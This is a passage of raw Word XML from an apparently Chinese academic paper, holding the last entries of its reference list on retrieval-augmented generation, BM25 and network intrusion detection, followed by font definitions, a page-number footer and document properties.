      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>[13] DeepSeek-AI. DeepSeek-V3 Technical Report[R]. arXiv:2412.19437, 2024.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3EF0532A">
      <w:pPr>
        <w:spacing w:before="0" w:after="40" w:line="360" w:lineRule="auto"/>
        <w:ind w:left="480" w:hanging="480"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>[14] Lewis P, Perez E, Piktus A, et al. Retrieval-Augmented Generation for Knowledge-Intensive NLP Tasks[C]//Advances in Neural Information Processing Systems (NeurIPS). 2020: 9459-9474.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78825CA8">
      <w:pPr>
        <w:spacing w:before="0" w:after="40" w:line="360" w:lineRule="auto"/>
        <w:ind w:left="480" w:hanging="480"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>[15] Robertson S, Zaragoza H. The Probabilistic Relevance Framework: BM25 and Beyond[J]. Foundations and Trends in Information Retrieval, 2009, 3(4): 333-389.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="676AEDDD">
      <w:pPr>
        <w:spacing w:before="0" w:after="40" w:line="360" w:lineRule="auto"/>
        <w:ind w:left="480" w:hanging="480"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>[16] Sommer R, Paxson V. Outside the Closed World: On Using Machine Learning for Network Intrusion Detection[C]//IEEE Symposium on Security and Privacy. 2010: 305-316.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="588CF324">
      <w:pPr>
        <w:spacing w:before="0" w:after="40" w:line="360" w:lineRule="auto"/>
        <w:ind w:left="480" w:hanging="480"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>[17] Panjwani S, Tan S, Jarrin K M, et al. An Experimental Evaluation to Determine if Portscan Detectors are Effective for Zero-Day Scanning[C]//IEEE/IFIP International Conference on Dependable Systems and Networks (DSN). 2015: 211-222.</w:t>
      </w:r>
    </w:p>
    <w:sectPr>
      <w:footerReference r:id="rId5" w:type="default"/>
      <w:pgSz w:w="11906" w:h="16838"/>
      <w:pgMar w:top="1440" w:right="1644" w:bottom="1440" w:left="1644"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文泉驿微米黑"/>
    <w:panose1 w:val="00000000000000000000"/>
    <w:charset w:val="00"/>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文泉驿微米黑"/>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文泉驿微米黑">
    <w:panose1 w:val="020B0606030804020204"/>
    <w:charset w:val="86"/>
    <w:family w:val="auto"/>
    <w:pitch w:val="default"/>
    <w:sig w:usb0="E10002EF" w:usb1="6BDFFCFB" w:usb2="00800036" w:usb3="00000000" w:csb0="603E019F" w:csb1="DFD7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03" w:csb0="600101FF" w:csb1="FFFF0000"/>
  </w:font>
  <w:font w:name="ＭＳ 明朝">
    <w:altName w:val="Gubbi"/>
    <w:panose1 w:val="00000000000000000000"/>
    <w:charset w:val="80"/>
    <w:family w:val="roman"/>
    <w:pitch w:val="default"/>
    <w:sig w:usb0="00000000" w:usb1="00000000" w:usb2="00000010" w:usb3="00000000" w:csb0="00020000" w:csb1="00000000"/>
  </w:font>
  <w:font w:name="ＭＳ 明朝">
    <w:altName w:val="Gubbi"/>
    <w:panose1 w:val="00000000000000000000"/>
    <w:charset w:val="86"/>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OpenSymbol">
    <w:panose1 w:val="05010000000000000000"/>
    <w:charset w:val="00"/>
    <w:family w:val="auto"/>
    <w:pitch w:val="default"/>
    <w:sig w:usb0="800000AF" w:usb1="1001ECEA" w:usb2="00000000" w:usb3="00000000" w:csb0="80000001" w:csb1="00000000"/>
  </w:font>
  <w:font w:name="Courier">
    <w:altName w:val="Dhurjati"/>
    <w:panose1 w:val="02000500000000000000"/>
    <w:charset w:val="00"/>
    <w:family w:val="auto"/>
    <w:pitch w:val="default"/>
    <w:sig w:usb0="00000000" w:usb1="00000000" w:usb2="00000000" w:usb3="00000000" w:csb0="00000001" w:csb1="00000000"/>
  </w:font>
  <w:font w:name="Dhurjati">
    <w:panose1 w:val="02000600000000000000"/>
    <w:charset w:val="00"/>
    <w:family w:val="auto"/>
    <w:pitch w:val="default"/>
    <w:sig w:usb0="80200003" w:usb1="00000000" w:usb2="00000000" w:usb3="00000000" w:csb0="00000001" w:csb1="00000000"/>
  </w:font>
  <w:font w:name="黑体">
    <w:altName w:val="文泉驿微米黑"/>
    <w:panose1 w:val="00000000000000000000"/>
    <w:charset w:val="00"/>
    <w:family w:val="auto"/>
    <w:pitch w:val="default"/>
    <w:sig w:usb0="00000000" w:usb1="00000000" w:usb2="00000000" w:usb3="00000000" w:csb0="00000000" w:csb1="00000000"/>
  </w:font>
  <w:font w:name="Consolas">
    <w:altName w:val="Gubbi"/>
    <w:panose1 w:val="00000000000000000000"/>
    <w:charset w:val="00"/>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ＭＳ ゴシック">
    <w:altName w:val="Gubbi"/>
    <w:panose1 w:val="00000000000000000000"/>
    <w:charset w:val="00"/>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B734E">
    <w:pPr>
      <w:pStyle w:val="24"/>
      <w:jc w:val="center"/>
    </w:pPr>
    <w:r>
      <w:rPr>
        <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
        <w:b w:val="0"/>
        <w:color w:val="000000"/>
        <w:sz w:val="21"/>
      </w:rPr>
      <w:t xml:space="preserve">第 </w:t>
    </w:r>
    <w:r>
      <w:rPr>
        <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
        <w:b w:val="0"/>
        <w:color w:val="000000"/>
        <w:sz w:val="21"/>
      </w:rPr>
      <w:fldChar w:fldCharType="begin"/>
    </w:r>
    <w:r>
      <w:rPr>
        <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
        <w:b w:val="0"/>
        <w:color w:val="000000"/>
        <w:sz w:val="21"/>
      </w:rPr>
      <w:instrText xml:space="preserve"> PAGE </w:instrText>
    </w:r>
    <w:r>
      <w:rPr>
        <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
        <w:b w:val="0"/>
        <w:color w:val="000000"/>
        <w:sz w:val="21"/>
      </w:rPr>
      <w:fldChar w:fldCharType="end"/>
    </w:r>
    <w:r>
      <w:rPr>
        <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
        <w:b w:val="0"/>
        <w:color w:val="000000"/>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BFC9F8E"/>
    <w:rsid w:val="FFE63C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156</Pages>
  <Words>0</Words>
  <Characters>0</Characters>
  <Lines>0</Lines>
  <Paragraphs>0</Paragraphs>
  <TotalTime>0</TotalTime>
  <ScaleCrop>false</ScaleCrop>
  <LinksUpToDate>false</LinksUpToDate>
  <CharactersWithSpaces>0</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ylf</cp:lastModifiedBy>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-10-29T09:46:07Z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2052-12.1.2.28080</vt:lpwstr>
  </property>
  <property fmtid="{D5CDD505-2E9C-101B-9397-08002B2CF9AE}" pid="3" name="ICV">
    <vt:lpwstr>8566796991EBE9ED5AA5E26AD991D0E0_42</vt:lpwstr>
  </property>
</Properties>
</file>